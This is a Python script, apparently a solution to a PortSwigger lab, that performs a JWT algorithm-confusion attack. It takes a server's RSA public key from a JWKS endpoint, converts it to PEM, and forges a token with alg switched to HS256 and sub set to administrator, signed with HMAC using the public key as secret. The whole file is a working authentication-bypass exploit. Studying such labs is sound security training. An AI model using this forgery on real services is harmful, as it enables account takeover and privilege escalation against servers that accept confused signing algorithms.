import base64, hmac, hashlib
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# JWK from /jwks.json
jwk = {
  "kty": "RSA",
  "e": "AQAB",
  "use": "sig",
  "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
  "alg": "RS256",
  "n": "sj2oHajSBloFiMQ4ibb4AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO-3JkQOMwgazq-j_8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt_y-NqZZOHFBEPfdRBrcOWqa8iiSHi-Any6XC_CRgThyRMLumedBZx8Ql0qX0O0_3ONvapVfv5d1NZIz4Ub1tKrd6ZfctGL3MDfy6MVnqfjUd0A_1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiEn2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e_xfAd7utO1qBh-q_F0u0wcakpIPeQ"
}

def b64url_decode(s): return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
def b64url_encode(data): return base64.urlsafe_b64encode(data).decode().rstrip('=')

# Convert JWK to RSA public key
modulus = int.from_bytes(b64url_decode(jwk['n']), 'big')
exponent = int.from_bytes(b64url_decode(jwk['e']), 'big')

public_key = rsa.RSAPublicNumbers(exponent, modulus).public_key()

# Get PEM format
pem = public_key.public_bytes(
  encoding=serialization.Encoding.PEM,
  format=serialization.PublicFormat.SubjectPublicKeyInfo
)

print("Extracted PEM public key:")
print(pem.decode())

# Forge JWT with alg=HS256
header = '{"kid":"66a4de73-4f3b-4bc3-af9e-913726ff79e9","alg":"HS256"}'
# Also set sub=administrator
payload = '{"iss":"portswigger","exp":1773429937,"sub":"administrator"}'

message = f"{b64url_encode(header.encode())}.{b64url_encode(payload.encode())}"

# Sign with HMAC-SHA256 using the PEM public key as the secret
signature = b64url_encode(hmac.new(pem, message.encode(), hashlib.sha256).digest())

forged_jwt = f"{message}.{signature}"

print("\nForged JWT:")
print(forged_jwt)
